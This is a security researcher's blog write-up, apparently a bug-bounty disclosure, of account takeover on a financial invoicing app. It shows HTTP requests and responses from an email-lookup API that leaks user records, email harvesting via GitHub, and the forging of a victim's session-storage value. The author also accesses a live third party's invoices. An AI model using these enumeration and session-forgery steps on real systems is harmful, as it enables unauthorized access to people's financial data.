<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="Naveen J" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="Naveen J" /> <title> Account Takeover via manipulating Session Storage - Naveen J </title> <link rel="alternate" href="http://localhost:4000/Account_Takeover-via-session-storage/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/Account_Takeover-via-session-storage/" /> <meta name="description" content="Taking over other user account via manipulating the local session Storage." /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="Account Takeover via manipulating Session Storage | Naveen J" /> <meta property="og:title" content="Account Takeover via manipulating Session Storage | Naveen J" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/Account_Takeover-via-session-storage/" /> <meta property="og:description" content="Taking over other user account via manipulating the local session Storage." /> <meta property="og:image" content="" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="Account Takeover via manipulating Session Storage | thevillagehackr" /> <meta name="twitter:url" content="http://localhost:4000/Account_Takeover-via-session-storage/" /> <meta name="twitter:site" content="@thevillagehackr" /> <meta name="twitter:creator" content="@thevillagehackr" /> <meta name="twitter:description" content="Taking over other user account via manipulating the local session Storage." /> <meta name="twitter:image" content="" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Naveen J" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> <!-- for mathjax support --> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">Home</a><a class="menu-link" href="/blog/">Blog</a><a class="menu-link" href="/about/">About</a><a class="menu-link" href="/projects/">Projects</a><!-- <a class="menu-link rss" href="/feed.xml"> <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 512 512" fill="#ED812E" > <title>RSS</title> <path d="M108.56,342.78a60.34,60.34,0,1,0,60.56,60.44A60.63,60.63,0,0,0,108.56,342.78Z" /> <path d="M48,186.67v86.55c52,0,101.94,15.39,138.67,52.11s52,86.56,52,138.67h86.66C325.33,312.44,199.67,186.67,48,186.67Z" /> <path d="M48,48v86.56c185.25,0,329.22,144.08,329.22,329.44H464C464,234.66,277.67,48,48,48Z" /> </svg> </a>---> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#session-storage">SESSION STORAGE</a>, <a class="tag" href="/tags/#account-takeover">ACCOUNT TAKEOVER</a>, <a class="tag" href="/tags/#misconfiguration">MISCONFIGURATION</a> </span> </div> <h1 class="header-title" itemprop="headline">Account Takeover via manipulating Session Storage</h1> <div class="post-meta"> <time datetime="2023-04-01T12:00:00+00:00" itemprop="datePublished"> Apr 01, 2023 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">Naveen J</span> </span> <time hidden datetime="" itemprop="dateModified"> Apr 01, 2023 </time> <span hidden itemprop="publisher" itemtype="Person">Naveen J</span> <span hidden itemprop="image"></span> <span hidden itemprop="mainEntityOfPage"><h1 id="target-background">Target Background</h1> <p>A Web application which can be used for financial purposes, in which we can generate the invoice, track and reconcile them. And the payments can be done for the invoices and money can be managed completely through the application .</p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <h1 id="target-background"> <a href="#target-background" class="anchor-head"></a> Target Background </h1> <p>A Web application which can be used for financial purposes, in which we can generate the invoice, track and reconcile them. And the payments can be done for the invoices and money can be managed completely through the application .</p> <h2 id="overview"> <a href="#overview" class="anchor-head"></a> Overview </h2> <p>I have created a test account through the sign up functionality in the application and after logging in, the application have asked to create an organization so we can provide access to our team members and assign them a particular roles based on how they have to play in the application.</p> <h2 id="recon"> <a href="#recon" class="anchor-head"></a> Recon </h2> <ul> <li>reactJS</li> <li>Akami Firewall</li> <li>REST APIs</li> <li>Cookie Authentication</li> </ul> <h2 id="user-enumeration"> <a href="#user-enumeration" class="anchor-head"></a> User Enumeration </h2> <p>At the login page after entering the username and password of my signed up user credentials the application sends a request to an API endpoint like below to verify whether the user is part of the organization, user exists in the DB or not.</p> <h3 id="request"> <a href="#request" class="anchor-head"></a> Request </h3> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/api/v1/user?email=nj@tvhsecurity.com</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">www.target.com</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">https://www.target.com/</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">iframe</span>
<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">cross-site</span>
<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
</code></pre></div></div> <h3 id="response"> <a href="#response" class="anchor-head"></a> Response </h3> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK </span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 29 Mar 2023 05:59:48 GMT </span>
<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">Express </span>
<span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">* </span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json; charset=utf-8 </span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">370 ETag: W/"172-rQhbOJIDRtY57xxDgEWDAhUpziE" </span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...; Path=/; HttpOnly </span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN </span>
<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff </span>
<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block </span>
<span class="na">Referrer-Policy</span><span class="p">:</span> <span class="s">strict-origin-when-cross-origin </span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close </span>
<span class="na">Strict-Transport-Security</span><span class="p">:</span> <span class="s">max-age=31536000; includeSubDomains</span>

<span class="p">{</span><span class="w">
  </span><span class="nl">"status"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
  </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Successfully Retrieved"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"result"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"UserId"</span><span class="p">:</span><span class="mi">601</span><span class="err">███</span><span class="p">,</span><span class="w">
      </span><span class="nl">"EmailId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"nj@tvhsecurity.com"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"RegionId"</span><span class="p">:</span><span class="w"> </span><span class="mi">160</span><span class="p">,</span><span class="w">
      </span><span class="nl">"RegionName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"IN"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"RoleId"</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span><span class="w">
      </span><span class="nl">"RoleName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Admin"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"CountryId"</span><span class="p">:</span><span class="w"> </span><span class="mi">26</span><span class="err">█</span><span class="p">,</span><span class="w">
      </span><span class="nl">"CountryName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"India"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Status"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Approved"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Naveen J"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"DeliveryCentre"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Bangalore, India"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"IsActive"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
      </span><span class="nl">"SubProcess"</span><span class="p">:</span><span class="w"> </span><span class="s2">"null"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <h2 id="post-login"> <a href="#post-login" class="anchor-head"></a> Post Login </h2> <p>After logging in into the application i was going through the JS files and local storages and found that the session storage which stores the information that was fetched in the response from the above user verify request. The user results are stored exactly how it was fetched from the API response.</p> <figure> <img src="session_storage.png" /> <figcaption>Fig 1. Local session storage.</figcaption> </figure> <h2 id="theory"> <a href="#theory" class="anchor-head"></a> Theory </h2> <p>My theory was initially to test the session storage once it might be vulnerable as the application is only using the encrypted cookies as authentication. In order to test that theory i need another user account so i have signed up another test account.</p> <p>Now we have 2 legitimate user accounts and we just have to test out the theory, it will work 100% if the application validates the users based on the session storage key <strong>values</strong>.</p> <p>The below screenshot shows the session storage of <strong>User1</strong> account.</p> <figure> <img src="Signed_up_user.png" /> <figcaption>Fig 2. Signed_up_user.</figcaption> </figure> <p>Now i just have to pass the <strong>User2</strong> account email Id in the email verify request and it will provide all the details that i want to do the manipulation.</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/api/v1/user?email=nj+1@tvhsecurity.com</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">www.target.com</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">https://www.target.com/</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">iframe</span>
<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">cross-site</span>
<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
</code></pre></div></div> <p>I have copied the required payload fron the JSON response and changed the session value of the <strong>login</strong> key. After refrshing the page i was able to login into the <strong>User2 account</strong>.</p> <h3 id="notes-"> <a href="#notes-" class="anchor-head"></a> Notes:- </h3> <ul> <li>User1 = nj@tvhsecurity.com</li> <li>User2 = nj+1@tvhsecurity.com</li> </ul> <p>Since both the accounts are fresh accounts i was unable to verify the issue as it is 100% solid, so inorder to verify it i have to make some financial stuffs in the application which was not possible at the moment.</p> <p>So i decided why not to give a try for a live account. I have to enumerate the users present in the application which is nearly very easy to do all I need is a list of email Ids which belongs to the target organization.</p> <h2 id="osint"> <a href="#osint" class="anchor-head"></a> OSINT </h2> <p>I have decided to do some OSINT recon on the target and get some email Id. After a while I did find some email Ids of the companies business peoples from the contact pages of the organization but all of them turned out to be a failure.</p> <h3 id="github-recon"> <a href="#github-recon" class="anchor-head"></a> GitHub Recon </h3> <p>So i decided to do some recon on github using the dorks and found few email Ids via the issues feature. The peoples from the organization commented few issues to their product/services repository codes.</p> <figure> <img src="github.png" /> <figcaption>Fig 3. GitHub OSINT recon.</figcaption> </figure> <p>I made a list and sent it to intruder and checked the content lenght, luckily few of them are valid.</p> <h2 id="verify-user"> <a href="#verify-user" class="anchor-head"></a> Verify User </h2> <h3 id="request-1"> <a href="#request-1" class="anchor-head"></a> Request </h3> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/api/v1/user?email=ba████████@target.com</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">www.target.com</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">https://www.target.com/</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">iframe</span>
<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">cross-site</span>
<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
</code></pre></div></div> <h3 id="response-1"> <a href="#response-1" class="anchor-head"></a> Response </h3> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK </span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 29 Mar 2023 05:59:48 GMT </span>
<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">Express </span>
<span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">* </span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json; charset=utf-8 </span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">370 ETag: W/"172-rQhbOJIDRtY57xxDgEWDAhUpziE" </span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">; Path=/; HttpOnly </span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN </span>
<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff </span>
<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block </span>
<span class="na">Referrer-Policy</span><span class="p">:</span> <span class="s">strict-origin-when-cross-origin </span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close </span>
<span class="na">Strict-Transport-Security</span><span class="p">:</span> <span class="s">max-age=31536000; includeSubDomains</span>

<span class="p">{</span><span class="w">
  </span><span class="nl">"status"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
  </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Successfully Retrieved"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"result"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"UserId"</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="err">██</span><span class="p">,</span><span class="w">
  </span><span class="nl">"EmailId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ba████████@target.com"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"RegionId"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="mi">300</span><span class="p">,</span><span class="w">
        </span><span class="mi">300</span><span class="w">
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"RegionName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"NA"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"RoleId"</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span><span class="w">
      </span><span class="nl">"RoleName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Admin"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"CountryId"</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span><span class="w">
      </span><span class="nl">"CountryName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"United States"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Status"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Approved"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Bane Smith"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"DeliveryCentre"</span><span class="p">:</span><span class="w"> </span><span class="s2">"New York, United States"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"IsActive"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
      </span><span class="nl">"SubProcess"</span><span class="p">:</span><span class="w"> </span><span class="s2">"null"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <h2 id="checkpoint"> <a href="#checkpoint" class="anchor-head"></a> Checkpoint </h2> <ul> <li>We have valid user email</li> <li>Details required to maipulate session value</li> </ul> <h3 id="extracted-new-session-value"> <a href="#extracted-new-session-value" class="anchor-head"></a> Extracted new session value </h3> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"UserId"</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="err">██</span><span class="p">,</span><span class="w">
  </span><span class="nl">"EmailId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ba████████@target.com"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"RegionId"</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span><span class="w">
  </span><span class="nl">"RegionName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"NA"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"RoleId"</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span><span class="w">
  </span><span class="nl">"RoleName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Admin"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"CountryId"</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span><span class="w">
  </span><span class="nl">"CountryName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"United States"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Status"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Approved"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Bane Smith"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"DeliveryCentre"</span><span class="p">:</span><span class="w"> </span><span class="s2">"New York, United States"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"IsActive"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
  </span><span class="nl">"SubProcess"</span><span class="p">:</span><span class="w"> </span><span class="s2">"null"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <p>The above is the value that we have to pass in the session storage to test the theory.</p> <h2 id="exploitation"> <a href="#exploitation" class="anchor-head"></a> Exploitation </h2> <p>Post successfully passing the extracted legitimate users details in the session storage value and after refreshing the page the application gave me access to that user’s accounts.</p> <figure> <img src="Exploitation.png" /> <figcaption>Fig 4. Exploitation</figcaption> </figure> <p>As you can see i am able to view the invoices generated in the target user’s account.</p> <p>Please note that due to the non-disclosure agreement these are the only information i was allowed to share.</p> <p>Thank you for reading.</p> <p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/Hacking_MNCs-CMS_Systems/" > <div class="nav-arrow">Previous</div> <span class="post-title">Hacking MNC's Content Management System due to misconfiguration and lack of authorization</span> </a> </nav> <footer class="footer"> <a class="footer_item" href="https://github.com/thevillagehacker/"> <img align="center" alt="Naveen's GitHub" width="30px" src="https://img.icons8.com/color/github.png"/></a> <a class="footer_item" href="https://www.linkedin.com/in/thevillagehacker/"> <img align="center" alt="Naveen's LinkedIn" width="30px" src="https://img.icons8.com/color/linkedin.png"/> </a> <a class="footer_item" href="mailto:nvnj1998@gmail.com"> <img align="center" alt="Naveen's E-Mail" width="30px" src="https://img.icons8.com/color/gmail.png" /> </a> <a class="footer_item" href="https://twitter.com/thevillagehackr"> <img align="center" alt="Naveen's twitter" width="30px" src="https://img.icons8.com/color/twitter.png" /> </a><br> <span class="footer_item">&copy; 2023</span> <small class="footer_copyright"> <!-- Klisé Theme: https://github.com/piharpi/jekyll-klise --> <a href="https://github.com/piharpi/jekyll-klise" target="_blank" rel="noreferrer noopener" >klisé</a > theme on <a href="https://jekyllrb.com" target="_blank" rel="noreferrer noopener" >jekyll</a > </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
